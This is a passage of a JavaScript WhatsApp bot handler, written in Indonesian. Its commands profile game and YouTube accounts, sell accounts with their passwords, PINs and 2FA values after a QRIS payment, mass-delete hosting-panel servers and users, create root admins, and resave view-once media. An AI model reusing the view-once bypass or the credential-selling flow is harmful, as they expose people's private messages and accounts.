◦ *Username* : ${data.result.user}
◦ *Bio* : ${data.result.bio}
◦ *Followers* : ${data.result.followers}
◦ *Following* : ${data.result.following}
◦ *Private* : ${data.result.privatemode ? 'Yes' : 'No'}`;
        await conn.sendMessage(m.chat, { 
            image: { url: data.result.profile },
            caption: caption 
        });
    } catch (e) {
        console.log(e);
        m.reply('Error occurred while fetching data!');
    }
}
break

case "ytstalk": case "infoyt": case "youtubestalk": {
 if (!text) return m.reply(example("ytstalk namaChannel"))
 try {
 const apiUrl = `https://fastrestapis.fasturl.cloud/stalk/youtube/simple?username=${encodeURIComponent(text)}`
 const response = await fetch(apiUrl)
 const data = await response.json()
 if (data.status !== 200) {
 return m.reply(`Error: ${data.content || "Failed to fetch data"}`)
 }
 const result = data.result
 const additionalInfo = result.additionalInfo
 let caption = `*🔍 YOUTUBE CHANNEL INFO*\n\n`
 caption += `*Channel:* ${result.channel}\n`
 caption += `*Description:* ${result.description || "No description"}\n`
 caption += `*URL:* ${result.url}\n\n`
 caption += `*📊 STATS*\n`
 caption += `*Subscribers:* ${additionalInfo.totalSubs || "0"}\n`
 caption += `*Total Videos:* ${additionalInfo.totalVideos || "0"}\n`
 caption += `*Total Views:* ${additionalInfo.views || "0"}\n`
 caption += `*Joined:* ${additionalInfo.join || "Unknown"}\n`
 if (result.socialMediaLinks && result.socialMediaLinks.length > 0) {
 caption += `\n*🔗 SOCIAL MEDIA*\n`
 result.socialMediaLinks.forEach((link, index) => {
 caption += `${index + 1}. ${link.url}\n`
 })
 }
 if (result.latestVideos && result.latestVideos.length > 0) {
 caption += `\n*📺 LATEST VIDEOS*\n`
 for (let i = 0; i < Math.min(3, result.latestVideos.length); i++) {
 const video = result.latestVideos[i]
 caption += `${i + 1}. *${video.title}*\n`
 caption += ` Views: ${video.views}\n`
 caption += ` URL: ${video.videoUrl}\n\n`
 }
 }
 await conn.sendMessage(m.chat, {
 image: { url: result.profile },
 caption: caption
 }, { quoted: m })
 } catch (error) {
 console.log(error)
 m.reply('Error saat mengambil informasi channel YouTube')
 }
}
break

case 'setall': {
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
 if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <key> <value>\nExample:\nsetall namaOwner Biyuuu\n\nJika ingin melihat isi settings.js agar key nya tau ketik:\n$ cat settings.js`);

 let key, value;
 
 if (m.quoted) {
 const parts = text.split(' ');
 key = parts[0];
 value = parts.slice(1).join(' ') || m.quoted.text;
 } else {
 const parts = text.split(' ');
 key = parts[0];
 value = parts.slice(1).join(' ');
 }

 if (!key) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <key> <value>`);

 try {
 const fs = require('fs');
 const path = './settings.js'; 
 let content = fs.readFileSync(path, 'utf8');
 
 const keyPattern = new RegExp(`global\\.${key}\\s*=\\s*(['"\`])([^'"\`]*?)(['"\`])|global\\.${key}\\s*=\\s*([^\\n;]*)`);
 const match = content.match(keyPattern);
 
 if (!match) {
 return m.reply(`*Key Tidak Ditemukan!*\nKey '${key}' tidak ditemukan dalam settings.js`);
 }
 
 let newContentValue;
 if (match[1]) {
 newContentValue = `global.${key} = ${match[1]}${value}${match[3]}`;
 } else {
 newContentValue = `global.${key} = ${value}`;
 }
 
 const replacePattern = new RegExp(`global\\.${key}\\s*=\\s*(['"\`])([^'"\`]*?)(['"\`])|global\\.${key}\\s*=\\s*([^\\n;]*)`);
 content = content.replace(replacePattern, newContentValue);
 
 fs.writeFileSync(path, content);
 
 if (match[1]) {
 global[key] = value;
 } else {
 try {
 global[key] = JSON.parse(value);
 } catch (e) {
 global[key] = value;
 }
 }
 
 await conn.sendMessage(m.chat, { text: `_Berhasil Mengganti ${key} Menjadi ${value} ✅_` }, { quoted: m });
 } catch (error) {
 console.error('Error updating settings.js:', error);
 await conn.sendMessage(m.chat, { text: `_Gagal menyimpan perubahan ke file settings.js: ${error.message}_` }, { quoted: m });
 }
}
break

case "ytstalk2":
case "youtubestalk2": {
  if (!text) return m.reply(`Example: ${prefix + command} username`);
  try {
    let api = await fetch(`https://api.siputzx.my.id/api/stalk/youtube?username=${text}`);
    let data = await api.json();
    if (!data.status) return m.reply('Search failed! Try again later.');
    if (!data.data) return m.reply('No results found! Try searching on a search engine for more information.');
    
    let caption = `乂 *YOUTUBE STALK* ◦\n\n`;
    caption += `乂 *Username* : ${data.data.channel.username}\n`;
    caption += `乂 *Subscriber Count* : ${data.data.channel.subscriberCount}\n`;
    caption += `乂 *Video Count* : ${data.data.channel.videoCount}\n`;
    caption += `乂 *Avatar Url* : ${data.data.channel.avatarUrl}\n`;
    caption += `乂 *Channel Url* : ${data.data.channel.channelUrl}\n`;
    caption += `乂 *Description* : ${data.data.channel.description}\n\n`;
    
    await conn.sendMessage(m.chat, { image: { url: data.data.channel.avatarUrl }, caption: caption });
    
    let latestVideos = data.data.latest_videos;
    for (let i = 0; i < latestVideos.length; i++) {
      let video = latestVideos[i];
      let videoCaption = `乂 *VIDEO ${i + 1}* ◦\n\n`;
      videoCaption += `乂 *Title* : ${video.title}\n`;
      videoCaption += `乂 *Video ID* : ${video.videoId}\n`;
      videoCaption += `乂 *Published Time* : ${video.publishedTime}\n`;
      videoCaption += `乂 *View Count* : ${video.viewCount}\n`;
      videoCaption += `乂 *Duration* : ${video.duration}\n`;
      videoCaption += `乂 *Video Url* : ${video.videoUrl}\n\n`;
      
      await conn.sendMessage(m.chat, { image: { url: video.thumbnail }, caption: videoCaption });
      await conn.sendMessage(m.chat, { video: { url: video.videoUrl }, caption: `Here's your video!` });
    }
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while searching!');
  }
}
break
case 'epep': case 'ff': case 'ffstalk': {
  if (!q.includes(',')) return m.reply(`Contoh: ${prefix + command} 537212033,ID`)
  let [id, region] = q.split(',').map(x => x.trim())
  if (!id || !region) return m.reply(`Contoh: ${prefix + command} 537212033,ID`)
  
  try {
    let res = await fetch(`https://www.velyn.biz.id/api/stalk/FreeFireStalk?id=${id}&region=${region}`)
    let json = await res.json()
    if (!json.status) return m.reply("Data tidak ditemukan!")
    let data = json.data.AccountInfo
    let guild = json.data.GuildInfo || {}
    let social = json.data.socialinfo || {}
    let pet = json.data.petInfo || {}
    let captain = json.data.captainBasicInfo || {}
    let credit = json.data.creditScoreInfo || {}

    let teks = `*「 STALK FREE FIRE 」*\n\n`
    teks += `*Nama:* ${data.AccountName}\n`
    teks += `*ID:* ${id}\n`
    teks += `*Region:* ${data.AccountRegion}\n`
    teks += `*Level:* ${data.AccountLevel}\n`
    teks += `*EXP:* ${data.AccountEXP.toLocaleString()}\n`
    teks += `*Likes:* ${data.AccountLikes}\n`
    teks += `*BR Rank Point:* ${data.BrRankPoint}\n`
    teks += `*CS Rank Point:* ${data.CsRankPoint}\n`
    teks += `*Badge BP:* ${data.AccountBPBadges}\n`
    teks += `*Tanggal Buat Akun:* ${new Date(data.AccountCreateTime * 1000).toLocaleString()}\n`
    teks += `*Login Terakhir:* ${new Date(data.AccountLastLogin * 1000).toLocaleString()}\n`
    teks += `*Versi Rilis:* ${data.ReleaseVersion}\n\n`
    teks += `*「 GUILD 」*\n`
    teks += `*Nama Guild:* ${guild.GuildName || '-'}\n`
    teks += `*Level:* ${guild.GuildLevel || '-'}\n`
    teks += `*Member:* ${guild.GuildMember || '-'} / ${guild.GuildCapacity || '-'}\n\n`
    teks += `*「 PET 」*\n`
    teks += `*Level:* ${pet.level || '-'}\n`
    teks += `*EXP:* ${pet.exp || '-'}\n\n`
    teks += `*「 SOSIAL 」*\n`
    teks += `*Bahasa:* ${social.AccountLanguage || '-'}\n`
    teks += `*Mode Favorit:* ${social.AccountPreferMode || '-'}\n`
    teks += `*Status:* ${social.AccountSignature || '-'}\n\n`
    teks += `*「 CAPTAIN 」*\n`
    teks += `*Nama:* ${captain.nickname || '-'}\n`
    teks += `*Level:* ${captain.level || '-'}\n`
    teks += `*Rank:* ${captain.rank || '-'} (${captain.rankingPoints || 0} pts)\n`
    teks += `*CS Rank:* ${captain.csRank || '-'} (${captain.csRankingPoints || 0} pts)\n`
    teks += `*Likes:* ${captain.liked || '-'}\n`
    teks += `*Login Terakhir:* ${new Date(captain.lastLoginAt * 1000).toLocaleString()}\n\n`
    teks += `*「 CREDIT SCORE 」*\n`
    teks += `*Nilai:* ${credit.creditScore || '-'}\n`
    teks += `*Periode:* ${new Date(credit.periodicSummaryStartTime * 1000).toLocaleDateString()} - ${new Date(credit.periodicSummaryEndTime * 1000).toLocaleDateString()}\n`
    m.reply(teks)
  } catch (e) {
    console.log(e)
    m.reply('Gagal mengambil data. Pastikan ID dan region benar.')
  }
  }
  break
 
 case "ml": case "mlstalk": {
  let inputData;
  if (argsbiyuoffc.length >= 2) {
    inputData = argsbiyuoffc[1].split('|');
  } else if (body.trim().includes('|')) {
    inputData = body.trim().split(/\s+/)[1].split('|');
  } else {
    m.reply('Format salah! Gunakan: .ml id|zoneid');
    return;
  }
  if (inputData.length < 2) {
    m.reply('Format salah! Gunakan: .ml id|zoneid');
    return;
  }
  const userId = inputData[0];
  const zoneId = inputData[1];
  const axios = require('axios');
  axios.get(`https://vapis.my.id/api/ml-stalk?id=${userId}&zoneid=${zoneId}`)
    .then(response => {
      const result = response.data;
      if (result.status && result.data.status.code === 0) {
        const userData = result.data.data;
        const productData = userData.product;
        const caption = `*✅ ML ACCOUNT FOUND*\n\n` +
          `*🎮 Game*: ${productData.name}\n` +
          `*👤 Username*: ${userData.userNameGame}\n` +
          `*🆔 User ID*: ${userData.gameId}\n` +
          `*🌐 Zone ID*: ${userData.zoneId}\n` +
          `_Mobile Legends: Bang Bang_`;
        m.reply(caption);
      } else {
        const errorMsg = result.data?.status?.message || 'Terjadi kesalahan saat mencari data.';
        m.reply(`❌ Error: ${errorMsg}`);
      }
    })
    .catch(error => {
      console.error(error);
      m.reply('❌ Gagal menghubungi API. Silakan coba lagi nanti.');
    });
} break
            
case 'delstock': {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Format Salah!\nKetik delstock <kode_produk>|<index_stok>\nContoh: delstock SPO1B|0');

    const [kodeProduk, indexStr] = text.split('|').map(item => item.trim());
    if (!kodeProduk || isNaN(indexStr)) {
        return m.reply('Format Salah!\nKetik delstock <kode_produk>|<index_stok>\nContoh: delstock SPO1B|0');
    }

    const index = parseInt(indexStr);
    if (index < 0) {
        return m.reply('Index stok tidak valid.');
    }

    const filePath = `source/${kodeProduk}.json`;
    let stokData = [];
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        stokData = JSON.parse(data);
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat membaca data stok.');
    }

    if (index >= stokData.length) {
        return m.reply(`Index stok ${index} tidak ditemukan. Stok tersedia: ${stokData.length}`);
    }

    const deletedStok = stokData.splice(index, 1)[0];


    try {
        fs.writeFileSync(filePath, JSON.stringify(stokData, null, 4), 'utf8');
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat menyimpan data stok.');
    }

    m.reply(`Stok berhasil dihapus dari produk ${kodeProduk}:\n\n` +
            `➤ Stok yang dihapus: ${deletedStok}\n` +
            `➤ Sisa stok: ${stokData.length}`);
}
break

case 'stock': {
   
    let produkList = [];
    try {
        const produkData = fs.readFileSync('source/produk.json', 'utf8');
        produkList = JSON.parse(produkData);
    } catch (err) {
        console.error('Terjadi kesalahan saat membaca data produk:', err);
        return m.reply('❌ Terjadi kesalahan saat membaca data produk.');
    }

    if (produkList.length === 0) {
        return m.reply('❌ Tidak ada produk yang tersedia.');
    }

    
    let message = `╭────〔 PRODUCT LIST📦 〕─ 
┊・ Cara Membeli Produk Ketik Perintah Berikut
┊・ buyproduk <kode> <jumlah>
┊・ Contoh: buyproduk spo 1
┊・ Pastikan Code & Jumlah Akun di Ketik dengan benar
┊ ・ Contact Admin: 085776461481
╰┈┈┈┈┈┈┈┈\n\n`;

    for (const produk of produkList) {
        const filePath = `source/${produk.id}.json`;
        let stokData = [];

        
        if (fs.existsSync(filePath)) {
            try {
                const data = fs.readFileSync(filePath, 'utf8');
                stokData = JSON.parse(data);
            } catch (err) {
                console.error(`Terjadi kesalahan saat membaca stok untuk produk ${produk.id}:`, err);
                continue;
            }
        }

        const sold = produk.terjual || 0;
        const stock = stokData.length;

        message += `╭──〔 ${produk.nama} 〕─\n` +
        `┊・ 🏷️| Harga: Rp${produk.harga.toLocaleString('id-ID')}\n` +
        `┊・ 📦| Stok Tersedia: ${stock}\n` +
        `┊・ 🧾| Stok Terjual: ${sold}\n` +
        `┊・ 🔐| Kode: ${produk.id}\n` +
        `┊・ 📝| Desk: ${produk.deskripsi}\n` +
        `╰┈┈┈┈┈┈┈┈\n\n`;
    }

    
    m.reply(message);
}
break
case "domain": {
  if (!isCreator) return Reply(mess.owner)
  const argsyu = body.trim().split(/ +/).slice(1)
  if (!argsyu[0]) return m.reply("Domain tidak ditemukan!")
  if (isNaN(argsyu[0])) return m.reply("Domain tidak ditemukan!")
  const dom = Object.keys(global.subdomain)
  if (Number(argsyu[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
  if (!argsyu[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
  let tldnya = dom[argsyu[0] - 1]
  const [host, ip] = argsyu[1].split("|")
  const axios = require('axios');
  
  async function subDomain1(host, ip) {
    return new Promise((resolve) => {
      axios.post(
        `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
        { 
          type: "A", 
          name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, 
          content: ip.replace(/[^0-9.]/gi, ""), 
          ttl: 3600, 
          priority: 10, 
          proxied: false 
        },
        {
          headers: {
            Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
            "Content-Type": "application/json",
          },
        }
      ).then((e) => {
        let res = e.data
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
      }).catch((e) => {
        let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
        let err1Str = String(err1)
        resolve({ success: false, error: err1Str })
      })
    })
  }
  
  await subDomain1(host.toLowerCase(), ip).then(async (e) => {
    if (e['success']) {
      let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
      await m.reply(teks)
    } else return m.reply(`${e['error']}`)
  })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'clearserver': {
  if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
  const args = body.trim().split(',');
  const panelVersi = argsbiyuoffc[0].split(' ')[1]?.trim();
  const excludedIds = argsbiyuoffc.slice(1).map(x => x.trim());
  if (!panelVersi || !['v1', 'v2', 'v3', 'v4', 'v5'].includes(panelVersi)) {
    return m.reply(`*Format salah!*
Contoh penggunaan:
> clearserver v1
> clearserver v2, 123, 456  *(kecualikan ID 123 & 456)*

Note: pakai "-" untuk hapus semua server tanpa pengecualian.`);
  }
  const panelConfig = {
    v1: { domain: global.domain, apikey: global.apikey },
    v2: { domain: global.domainV2, apikey: global.apikeyV2 },
    v3: { domain: global.domainV3, apikey: global.apikeyV3 },
    v4: { domain: global.domainV4, apikey: global.apikeyV4 },
    v5: { domain: global.domainV5, apikey: global.apikeyV5 },
  }[panelVersi];

  try {
    let res = await fetch(panelConfig.domain + "/api/application/servers", {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + panelConfig.apikey,
      }
    });
    let data = await res.json();
    let servers = data.data;
    if (!servers || servers.length === 0) return m.reply('Tidak ada server ditemukan.');
    for (let s of servers) {
      let id = s.attributes.id.toString();
      if (excludedIds.includes(id)) {
        m.reply(`*Server dengan ID ${id} (${s.attributes.name}) dikecualikan.*`);
        continue;
      }
      let del = await fetch(panelConfig.domain + "/api/application/servers/" + id, {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + panelConfig.apikey,
        }
      });
      if (del.ok) {
        m.reply(`*Berhasil menghapus server ID ${id} (${s.attributes.name})*`);
      } else {
        let err = await del.text();
        m.reply(`Gagal hapus server ID ${id}. ${del.status} - ${err}`);
      }
    }
    m.reply('*Selesai! Semua server berhasil dihapus kecuali yang dikecualikan.*');
  } catch (e) {
    m.reply('Terjadi kesalahan: ' + e.message);
  }
}
break

case 'clearadmin': {
  if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
  const args = body.trim().split(',');
  const panelVersi = argsbiyuoffc[0].split(' ')[1]?.trim();
  const excludedIds = argsbiyuoffc.slice(1).map(x => x.trim());
  if (!panelVersi || !['v1', 'v2', 'v3', 'v4', 'v5'].includes(panelVersi)) {
    return m.reply(`*Format salah!*
Contoh penggunaan:
> clearadmin v1
> clearadmin v2, 123, 456  *(kecualikan user ID 123 & 456)*

Note: pakai "-" untuk hapus semua user tanpa pengecualian.`);
  }
  const panelConfig = {
    v1: { domain: global.domain, apikey: global.apikey },
    v2: { domain: global.domainV2, apikey: global.apikeyV2 },
    v3: { domain: global.domainV3, apikey: global.apikeyV3 },
    v4: { domain: global.domainV4, apikey: global.apikeyV4 },
    v5: { domain: global.domainV5, apikey: global.apikeyV5 },
  }[panelVersi];

  try {
    let res = await fetch(panelConfig.domain + "/api/application/users", {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + panelConfig.apikey,
      }
    });
    let data = await res.json();
    let users = data.data;
    if (!users || users.length === 0) return m.reply('Tidak ada user ditemukan.');
    for (let u of users) {
      let id = u.attributes.id.toString();
      if (excludedIds.includes(id)) {
        m.reply(`*User dengan ID ${id} (${u.attributes.username}) dikecualikan.*`);
        continue;
      }
      let del = await fetch(panelConfig.domain + "/api/application/users/" + id, {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + panelConfig.apikey,
        }
      });
      if (del.ok) {
        m.reply(`*Berhasil menghapus user ID ${id} (${u.attributes.username})*`);
      } else {
        let err = await del.text();
        m.reply(`Gagal hapus user ID ${id}. ${del.status} - ${err}`);
      }
    }
    m.reply('*Selesai! Semua user berhasil dihapus kecuali yang dikecualikan.*');
  } catch (e) {
    m.reply('Terjadi kesalahan: ' + e.message);
  }
}
break
case "cadmin": {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return m.reply(example(`
Format:
  cadmin [versi] [nomor/mention] [username]

Contoh:
  cadmin v2 +628xxx Biyu
  cadmin @tag Biyu
  cadmin Biyu (otomatis jadi v1)
`))
  let versi = "v1"
  let nomor = m.sender
  let raw = text.trim()
  let versiMatch = raw.match(/^(v[1-5])\s+/i)
  if (versiMatch) {
    versi = versiMatch[1].toLowerCase()
    raw = raw.replace(versiMatch[0], "").trim()
  }
  if (m.mentionedJid && m.mentionedJid[0]) {
    nomor = m.mentionedJid[0]
    raw = raw.replace(/@(\d{5,16})/, "").trim()
  } else {
    let noMatch = raw.match(/^(\+?0?8[\d\s\-]{7,20}|\+?62[\d\s\-]{7,20})\s+/)
    if (noMatch) {
      let no = noMatch[1].replace(/[\s\-]/g, "").replace(/^0/, "62").replace(/^\+/, "")
      nomor = no + "@s.whatsapp.net"
      raw = raw.replace(noMatch[0], "").trim()
    }
  }
  let username = raw.toLowerCase().replace(/\s+/g, "")
  let email = username + "@gmail.com"
  let name = capital(username)
  let password = username + crypto.randomBytes(2).toString("hex")
  let config = {
    v1: { domain: global.domain, apikey: global.apikey },
    v2: { domain: domainV2, apikey: apikeyV2 },
    v3: { domain: domainV3, apikey: apikeyV3 },
    v4: { domain: domainV4, apikey: apikeyV4 },
    v5: { domain: domainV5, apikey: apikeyV5 }
  }[versi]
  let res = await fetch(config.domain + "/api/application/users", {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + config.apikey
    },
    body: JSON.stringify({
      email,
      username,
      first_name: name,
      last_name: "Admin",
      root_admin: true,
      language: "en",
      password
    })
  })
  let data = await res.json()
  if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
  let user = data.attributes
  if (m.isGroup) m.reply(`✅ *Admin ${versi.toUpperCase()} berhasil dibuat!*\nData akun dikirim ke private ${nomor.split("@")[0]}`)
  let teks = `*Data Akun Admin Panel ${versi.toUpperCase()}*

*📡 ID:* ${user.id}
*👤 Username:* ${user.username}
*🔐 Password:* ${password}
*🌐 Domain:* ${config.domain}

*Syarat & Ketentuan:*
• Akun expired dalam 1 bulan
• Jangan asal hapus server!
• Ketahuan maling? auto ban + delete akun!`
  fs.writeFileSync("./akunpanel.txt", teks)
  await conn.sendMessage(nomor, {
    document: fs.readFileSync("./akunpanel.txt"),
    fileName: "akunpanel.txt",
    mimetype: "text/plain",
    caption: teks
  }, { quoted: m })
  fs.unlinkSync("./akunpanel.txt")
  m.reply("✅ File akun admin berhasil dikirim ke " + nomor.split("@")[0])
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listseller": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus reseller ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'buyproduk': {
 if (!text) return m.reply('Format Salah!\nKetik buyproduk <kode_produk> <jumlah>\nContoh: buyproduk spo1b 1');
 
 const [idProduk, jumlahStr] = text.split(' ').map(item => item.trim());
 if (!idProduk || isNaN(jumlahStr) || parseInt(jumlahStr) <= 0) {
   return m.reply('Format Salah!\nKetik buyproduk <kode_produk> <jumlah>\nContoh: buyproduk spo1b 1');
 }
 const jumlah = parseInt(jumlahStr);
 let produkList = [];
 try {
   const data = fs.readFileSync('source/produk.json', 'utf8');
   produkList = JSON.parse(data);
 } catch (err) {
   console.error(err);
   return m.reply('Terjadi kesalahan saat membaca data produk.');
 }
 const produk = produkList.find(produk => produk.id === idProduk);
 if (!produk) {
   return m.reply('Produk tidak ditemukan.\nContoh: buyproduk spo1b 1');
 }
 const jsonFileName = `source/${produk.id}.json`;
 const stokData = fs.readFileSync(`${jsonFileName}`, 'utf8');
 const stokJson = JSON.parse(stokData);
 const stok = stokJson.length;
 if (stok <= 0) {
   return m.reply(`Stok ${produk.id} habis. Silahkan chat owner untuk restock.`);
 } else if (jumlah > stok) {
   return m.reply(`Jumlah yang diminta (${jumlah}) melebihi stok yang tersedia (${stok}). Silahkan coba lagi dengan jumlah yang sesuai.`);
 }
 const randomFee = Math.floor(Math.random() * 150);
 const totalAmount = produk.harga * jumlah + randomFee;
 const axios = require('axios');
 try {
   const qrisResponse = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${totalAmount}&codeqr=${global.qrisOrderKuota}`);
   
   if (!qrisResponse.data.result) {
     return m.reply('Gagal membuat pembayaran QRIS. Silahkan coba lagi.');
   }
   const qrisData = qrisResponse.data.result;
   const teks3 = ` *▧ INFORMASI PEMBAYARAN*
*• ID :* ${qrisData.transactionId}
*• Total Pembayaran :* Rp${await toIDR(qrisData.amount)}
*• Expired :* 5 menit 

*Note :* QRIS pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid! Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu. 

Ketik *.batalbeli* untuk membatalkan `;

   let msgQr = await conn.sendMessage(m.chat, { 
     footer: `${botname}`, 
     buttons: [{ 
       buttonId: `${prefix}batalbeli`, 
       buttonText: { displayText: 'Batalkan Pembelian' }, 
       type: 1 
     }], 
     headerType: 1, 
     viewOnce: true, 
     image: { url: qrisData.qrImageUrl }, 
     caption: teks3, 
     contextInfo: { mentionedJid: [m.sender] } 
   });

   if (!db.users[m.sender]) db.users[m.sender] = {};
   db.users[m.sender].status_deposit = true;
   
   db.users[m.sender].saweria = {
     msg: msgQr,
     produkId: idProduk,
     jumlah: jumlah,
     transactionId: qrisData.transactionId,
     amount: qrisData.amount
   };
   
   const interval = setInterval(async () => {
     try {
       const paymentStatusResponse = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
       const paymentStatus = paymentStatusResponse.data;

       if (paymentStatus && paymentStatus.amount === qrisData.amount.toString()) {
         clearInterval(interval);
         await conn.sendMessage(m.chat, { delete: msgQr.key }); 
         const productData = JSON.parse(fs.readFileSync(jsonFileName, 'utf8'));
         const purchasedProducts = productData.slice(0, jumlah);
         const remainingProducts = productData.slice(jumlah);
         fs.writeFileSync(jsonFileName, JSON.stringify(remainingProducts, null, 4), 'utf8');
         
         updateSoldCount(idProduk, jumlah);
         
         m.reply(`Pembayaran Terverifikasi. Cek Detail Pesananmu di Private Chat!`);
         
         const productDetails = purchasedProducts.map((item, index) => {
           return `*Product ${index + 1}*\n` +
                  `Email: ${item.email}\n` +
                  `Password: ${item.password}\n` +
                  `Profil: ${item.profil}\n` +
                  `PIN: ${item.pin}\n` +
                  `A2F: ${item.a2f}\n`;
         }).join('\n');
         
         await conn.sendMessage(m.sender, { 
           text: `*PEMBELIAN BERHASIL*\n\n*Produk:* ${produk.id}\n*Jumlah:* ${jumlah}\n\n*DETAIL PRODUK:*\n\n${productDetails}`, 
           contextInfo: { mentionedJid: [m.sender] } 
         });
         
         db.users[m.sender].status_deposit = false;
         delete db.users[m.sender].saweria;
       }
     } catch (err) {
       console.error('Error checking payment status:', err);
     }
   }, 25000); 

   setTimeout(async () => {
     clearInterval(interval);
     try {
       await conn.sendMessage(m.chat, { delete: msgQr.key }); 
       m.reply("QRIS pembayaran telah expired!");
       db.users[m.sender].status_deposit = false;
       if (db.users[m.sender].saweria) {
         delete db.users[m.sender].saweria;
       }
     } catch (err) {
       console.error('Error handling expired payment:', err);
     }
   }, 5 * 60000); 
 } catch (err) {
   console.error('Error in payment process:', err);
   return m.reply('Terjadi kesalahan saat memproses pembayaran. Silahkan coba lagi.');
 }
}
break

case "rvo": case "readviewonce": case "•": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return conn.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return conn.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
